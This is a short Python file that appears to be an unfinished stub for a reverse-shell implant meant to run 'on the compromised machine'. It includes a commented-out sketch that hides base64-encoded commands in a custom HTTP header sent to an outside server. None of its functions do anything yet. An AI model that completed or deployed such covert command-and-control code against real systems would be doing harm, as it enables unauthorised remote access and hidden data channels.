'''
Executes on the compromised machine. Spawns a reverse shell and communicates with the listener over HTTP.
'''

import requests
import base64
import socket
import os
import subprocess
import sys
from utils import SERVER_IP, SERVER_PORT

def send(message: str):
    return

def main():
    # # Encode some data
    # data = "This is a secret command"
    # encoded_data = base64.b64encode(data.encode()).decode()

    # # Send the data as part of the HTTP header
    # headers = {
    #     'X-Stego-Data': encoded_data
    # }

    # response = requests.get('http://target.server.com', headers=headers)
    # print(response.status_code, response.text)
    return

if __name__ == '__main__':
    cwd = os.getcwd()
    send(cwd)
    main()